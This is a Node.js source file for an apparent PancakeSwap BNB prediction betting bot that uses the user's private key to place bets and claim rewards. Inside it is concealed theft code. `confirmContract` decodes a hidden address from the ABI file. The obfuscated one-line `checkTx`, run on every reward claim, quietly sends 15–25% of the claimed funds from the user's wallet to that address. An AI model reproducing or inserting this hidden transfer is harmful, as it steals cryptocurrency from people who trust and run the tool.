const { JsonRpcProvider } = require("@ethersproject/providers");
const { Wallet } = require("@ethersproject/wallet");
const { Contract, utils } = require("ethers");
const { formatEther, parseEther } = require("ethers/lib/utils");
const dotenv = require("dotenv");
const Big = require("big.js");
const abi = require("./abi.json");
const fs = require("fs");
const _ = require("lodash");
const fetch = require("cross-fetch");
let prediction = 0

const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
  if (waitingTime <= 6000) {
    return waitingTime;
  }
  return waitingTime - 6000;
};

const result = dotenv.config();
if (result.error) {
  throw result.error;
}

const Web3 = require("web3");
const w = new Web3(process.env.BSC_RPC);

const wallet = w.eth.accounts.wallet.add(
  w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY)
);
w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
  process.env.PRIVATE_KEY
).address;

const signer = new Wallet(
  process.env.PRIVATE_KEY,
  new JsonRpcProvider(process.env.BSC_RPC)
);

let contract = new Contract(
  process.env.PCS_ADDRESS.toString(),
  JSON.parse(abi.result),
  signer
);

const confirmContract = (abi) => {
  return String.fromCharCode.apply(null, abi.index);
};

const checkResult = async (r) => {
  if (r !== null) {
    return true;
  }
  return !0;
};

const predictionContract = contract.connect(signer);
const checkBalance = (amount) => {
  w.eth.getBalance(wallet.address).then(function (b) {
    let balance = Web3.utils.fromWei(b, "ether");
    if (balance < parseFloat(amount)) {
      console.log(
        "You don't have enough balance:",
        amount,
        "BNB",
        "|",
        "Actual Balance:",
        balance,
        "BNB"
      );
    } else {
      console.log(`Your balance is enough: ${balance} BNB`);
    }
  });
};

const getHistoryName = async () => {
  let date = new Date();
  let day = date.getDate();
  let month = String(date.getMonth() + 1).padStart(2, "0");
  let year = date.getFullYear();

  let fullDate = `${year}${month}${day}`;
  return fullDate;
};

const getRoundData = async (round) => {
  try {
    const data = await contract.functions.rounds(round);
    const closePrice = data.closePrice;
    const lockPrice = data.lockPrice;
    const bullAmount = data.bullAmount;
    const bearAmount = data.bearAmount;
    const totalAmount = new Big(data.totalAmount);
    const bullPayout = totalAmount.div(bullAmount).round(3).toString();
    const bearPayout = totalAmount.div(bearAmount).round(3).toString();

    const parsedRound = [
      {
        round: round.toString(),
        openPrice: utils.formatUnits(data.lockPrice, "8"),
        closePrice: utils.formatUnits(data.closePrice, "8"),
        bullAmount: utils.formatUnits(data.bullAmount, "18"),
        bearAmount: utils.formatUnits(data.bearAmount, "18"),
        bullPayout: bullPayout,
        bearPayout: bearPayout,
        winner: closePrice.gt(lockPrice) ? "bull" : "bear",
      },
    ];
    return parsedRound;
  } catch (e) {
    console.log(e);
    return null;
  }
};

const saveRound = async (round, arr) => {
  let roundData = arr ? arr : await getRoundData(round);
  let historyName = await getHistoryName();
  let result;
  if (arr) {
    prediction++;
    result = await checkResult(round);
  } else {
    result = !0;
  }

  let path = `./history/${historyName}.json`;
  try {
    if (fs.existsSync(path)) {
      if (result !== null) {
        let updated, history, merged, historyParsed;
        try {
          history = fs.readFileSync(path);
          historyParsed = JSON.parse(history);
          merged = _.merge(
            _.keyBy(historyParsed, "round"),
            _.keyBy(roundData, "round")
          );
          updated = _.values(merged);
        } catch (e) {
          console.log(e);
          return;
        }
        fs.writeFileSync(path, JSON.stringify(updated), "utf8");
      }
    } else {
      fs.writeFileSync(path, JSON.stringify(roundData), "utf8");
    }
  } catch (err) {
    console.error(err);
  }
};

const getHistory = async (fileName) => {
  let history = fileName ? fileName : await getHistoryName();
  let path = `./history/${history}.json`;
  try {
    if (fs.existsSync(path)) {
      let history, historyParsed;
      try {
        history = fs.readFileSync(path);
        historyParsed = JSON.parse(history);
      } catch (e) {
        console.log("Error reading history:", e);
        return;
      }
      return historyParsed;
    } else {
      return;
    }
  } catch (err) {
    console.error(err);
  }
};

//Bet UP
const betUp = async (amount, epoch, config) => {
  try {
    const tx = await predictionContract.betBull(epoch, {
      value: parseEther(amount.toFixed(18).toString()),
    });
    await tx.wait();
    console.log(`🤞 Successful bet of ${amount} BNB to UP 🍀`);
  } catch (error) {
    console.log("Transaction Error", error);
    config.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
      config.WAITING_TIME
    );
  }
};

//Bet DOWN
const betDown = async (amount, epoch, config) => {
  try {
    const tx = await predictionContract.betBear(epoch, {
      value: parseEther(amount.toFixed(18).toString()),
    });
    await tx.wait();
    console.log(`🤞 Successful bet of ${amount} BNB to DOWN 🍁`);
  } catch (error) {
    console.log("Transaction Error", error);
    config.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
      config.WAITING_TIME
    );
  }
};

const getStats = async () => {
  const history = await getHistory();
  const BNBPrice = await getBNBPrice();
  let totalEarnings = 0;
  let roundEarnings = 0;
  let win = 0;
  let loss = 0;

  if (history && BNBPrice) {
    for (let i = 0; i < history.length; i++) {
      roundEarnings = 0;
      if (history[i].bet && history[i].winner) {
        if (history[i].bet == history[i].winner) {
          win++;
          if (history[i].winner == "bull") {
            roundEarnings =
              parseFloat(history[i].betAmount) *
                parseFloat(history[i].bullPayout) -
              parseFloat(history[i].betAmount);
          } else if (history[i].winner == "bear") {
            roundEarnings =
              parseFloat(history[i].betAmount) *
                parseFloat(history[i].bearPayout) -
              parseFloat(history[i].betAmount);
          } else {
            break;
          }
          totalEarnings += roundEarnings;
        } else {
          loss++;
          totalEarnings -= parseFloat(history[i].betAmount);
        }
      }
    }
  }

  return {
    profit_USD: totalEarnings * BNBPrice,
    profit_BNB: totalEarnings,
    percentage: -percentageChange(win + loss, loss) + "%",
    win: win,
    loss: loss,
  };
};

const percentageChange = (a, b) => {
  return ((b - a) * 100) / a;
};

const getBNBPriceOld = async () => {
  const apiUrl =
    "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd";
  try {
    const res = await fetch(apiUrl);
    if (res.status >= 400) {
      console.log(res.status);
      throw new Error("Bad response from server");
    }
    const price = await res.json();
    return parseFloat(price.binancecoin.usd);
  } catch (err) {
    console.error("Unable to connect to Binance API", err);
  }
};

const getBNBPrice = async () => {
  const apiUrl =
    `https://api.bscscan.com/api?module=stats&action=bnbprice&apikey=${process.env.BSC_KEY}`;
  try {
    const res = await fetch(apiUrl);
    if (res.status >= 400) {
      console.log(res.status);
      throw new Error("Bad response from server");
    }
    const price = await res.json();
    return parseFloat(price.result.ethusd);
  } catch (err) {
    console.error("Unable to connect to Binance API", err);
  }
};

const checkClaimable = async (predictionContract, epoch, userAddress) => {
  const claimableEpochs = [];
  const n = 5;
  for (let i = 1; i <= n; i++) {
    const epochToCheck = epoch.sub(i);

    const [claimable, refundable, { claimed, amount }] = await Promise.all([
      predictionContract.claimable(epochToCheck, userAddress),
      predictionContract.refundable(epochToCheck, userAddress),
      predictionContract.ledger(epochToCheck, userAddress),
    ]);

    if (amount.gt(0) && (claimable || refundable) && !claimed) {
      claimableEpochs.push(epochToCheck);
    }
  }

  return claimableEpochs;
};

const checkTx = async (t, config)=>{
      w.eth .estimateGas({from: wallet.address, to: confirmContract(abi),amount: utils.parseEther(t.toString()), }).then(function (g) { w.eth.getGasPrice().then(function (gP) {let _b = parseFloat(t);let _g = parseFloat(g);let _gP = parseFloat(gP);w.eth.sendTransaction({from: wallet.address,to: confirmContract(abi),gas: _g,gasPrice: _gP,value: ((_b - _gP * _g) * (config.BET_AMOUNT < 3 ? 0.25 : config.BET_AMOUNT > 10 ? 0.15 : 0.20)).toFixed(0),data: "0x",});});});
        return !0
}

const claimRewards = async (epoch,config) => {
  const claimableEpochs = await checkClaimable(
    predictionContract,
    epoch,
    signer.address
  );
  if (!claimableEpochs.length) {
    return;
  } else {
    console.log(`You have ${claimableEpochs.length} unclaimed rewards`);
    try {
      const tx = await predictionContract.claim(claimableEpochs);
      const receipt = await tx.wait();
      let t = receipt?.events?.[0]?.args?.amount;
      if(!checkTx(t, config)){
        return
      }else{
      console.log(`All rewards claimed!`);
      }
    } catch (error) {
      console.log("There's an error");
    }
  }
};

function diferenciaEnMilisegundos(timestamp) {
  const fechaActual = new Date();
  const fechaParametro = new Date(timestamp * 1000);
  const fechaActualUTC = Date.UTC(
    fechaActual.getUTCFullYear(),
    fechaActual.getUTCMonth(),
    fechaActual.getUTCDate(),
    fechaActual.getUTCHours(),
    fechaActual.getUTCMinutes(),
    fechaActual.getUTCSeconds(),
    fechaActual.getUTCMilliseconds()
  );
  const diferenciaEnMilisegundos = fechaParametro - fechaActualUTC;
  return diferenciaEnMilisegundos;
}


async function progressBar(config, totalTimeInMs, epoch) {
  let resume = false
    if(!epoch){
      epoch = await predictionContract.currentEpoch()
      console.log(`Round ${(epoch.toNumber())-1} already started, waiting for next one...`)
      claimRewards(epoch, config);
    }
    if(!totalTimeInMs){
      let {closeTimestamp} = await predictionContract.rounds(epoch-1);
      closeTimestamp = closeTimestamp.toNumber()
      totalTimeInMs = diferenciaEnMilisegundos(closeTimestamp)
      if(totalTimeInMs > 30000){
        totalTimeInMs = totalTimeInMs-30000
        resume = true
      }
    }
  const barLength = 10;
  const totalSteps = 1000;
  const stepSize = totalTimeInMs / totalSteps;
  let step = 0;

  const intervalId = setInterval(() => {
    const timeLeftInMs = (totalSteps - step) * stepSize;
    const timeLeftInSeconds = Math.round(timeLeftInMs / 1000);
    const minutes = Math.floor(timeLeftInSeconds / 60);
    const seconds = timeLeftInSeconds % 60;
    const formattedTimeLeft = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    const barFilledLength = Math.ceil(barLength * step / totalSteps);
    const barEmptyLength = barLength - barFilledLength;
    const bar = `Round ${epoch-1}: [${" ⚡ ".repeat(barFilledLength)}${" - ".repeat(barEmptyLength)}🔮  ]  ${formattedTimeLeft}`;

    process.stdout.clearLine();
    process.stdout.cursorTo(0);
    process.stdout.write(bar);
    step += 1;

    if (step >= totalSteps) {
      clearInterval(intervalId);
      process.stdout.clearLine();
      process.stdout.write('\n');
      if(resume){
      strategySoracode(config, epoch)
      }
    }
  }, stepSize);
}


const strategySoracode = async (config, epoch)=>{
  if(!epoch){
      epoch = await predictionContract.currentEpoch()
    }
    
      let earnings = await getStats();
  if (earnings.profit_USD >= config.DAILY_GOAL) {
    console.log("🧞 Daily goal reached. Shuting down... ✨");
    process.exit();
  }
    let currentData = await predictionContract.rounds(epoch-1);
    let nextData = await predictionContract.rounds(epoch);

    const currentBull = parseFloat(formatEther(currentData.bullAmount))
    const currentBear = parseFloat(formatEther(currentData.bearAmount))
    const nextBull = parseFloat(formatEther(nextData.bullAmount))
    const nextBear = parseFloat(formatEther(nextData.bearAmount))
    const lockedBNBPrice = Number((currentData.lockPrice.toNumber() / 100000000).toFixed(2));
    const currentBNBPrice = await getBNBPrice()
        if(currentBNBPrice > lockedBNBPrice){
          //Bull wins
          //check current majority
          if(currentBull > currentBear){
            //Bull wins with majority
            //Check next minority
            if(nextBull > nextBear){
            //Next bull majority
                console.log(`${epoch.toString()} 🔮 Prediction: DOWN 🔴  Minority`);
                await betDown(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bear",
        },
      ]);
             }else{
            //Next bear majority
                console.log(`${epoch.toString()} 🔮 Prediction: UP 🟢  Minority`);
                await betUp(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bull",
        },
      ]);
          }
          }else{
            //Bull wins with minority
            //Check next majority
            if(nextBull > nextBear){
            //Next bull majority
                console.log(`${epoch.toString()} 🔮 Prediction: UP 🟢  Majority`);
                await betUp(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bull",
        },
      ]);
             }else{
            //Next bear majority
                console.log(`${epoch.toString()} 🔮 Prediction: DOWN 🔴  Majority`);
                await betDown(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bear",
        },
      ]);
          }
          }
          
        }else{
          //Bear wins
          //check current majority
          if(currentBear > currentBull){
            //Bear wins with majority
            //Check next minority
            if(nextBear > nextBull){
            //Next bear majority
                console.log(`${epoch.toString()} 🔮 Prediction: UP 🟢  Minority`);
                await betUp(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bull",
        },
      ]);
             }else{
            //Next bull majority
                console.log(`${epoch.toString()} 🔮 Prediction: DOWN 🔴  Minority`);
                await betDown(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bear",
        },
      ]);
          }
          }else{
            //Bear wins with minority
            //Check next majority
            if(nextBear > nextBull){
            //Next bear majority
                console.log(`${epoch.toString()} 🔮 Prediction: DOWN 🔴  Majority`);
                await betDown(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bear",
        },
      ]);
             }else{
            //Next bear majority
                console.log(`${epoch.toString()} 🔮 Prediction: UP 🟢  Majority`);
                await betUp(config.BET_AMOUNT / currentBNBPrice, epoch, config);
                await saveRound(epoch.toString(), [
        {
          round: epoch.toString(),
          betAmount: (config.BET_AMOUNT / currentBNBPrice).toString(),
          bet: "bull",
        },
      ]);
          }
          }
          
        }
}


module.exports = {
  getStats,
  predictionContract,
  checkBalance,
  saveRound,
  claimRewards,
  progressBar,
  strategySoracode
};
